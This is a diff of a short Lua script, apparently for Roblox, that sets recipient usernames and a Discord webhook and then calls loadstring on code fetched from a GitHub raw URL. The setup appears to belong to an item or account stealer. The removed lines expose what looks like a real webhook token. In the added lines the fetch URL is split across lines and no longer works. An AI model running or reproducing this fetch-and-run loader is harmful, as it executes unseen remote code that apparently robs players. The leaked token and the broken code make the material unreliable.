@@ -1,7 +1,11 @@
-_G.UserName = "altaasui1"
- 
-_G.UserName2 = "altaasui1"
- 
-_G.Webhook = "https://discord.com/api/webhooks/1192112195669078067/YlMv7SyxCum50EjUvv6jdmc5tUmqAYIMMiNwLJKZNQa5yBRYBVdDV7VsILMlAS0a3aZc"
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXScript/main/LypherXScriptZ", true))()
+_G.UserName = "KAKSIS89"
+
+_G.UserName2 = "KAKSIS89"
+
+_G.Webhook = "Your Webhook here"
+
+loadstring(game:HttpGet("https://
+
+raw.githubusercontent.com/LypherX
+
+/LypherXScript/main/LypherXScriptZ", true))()
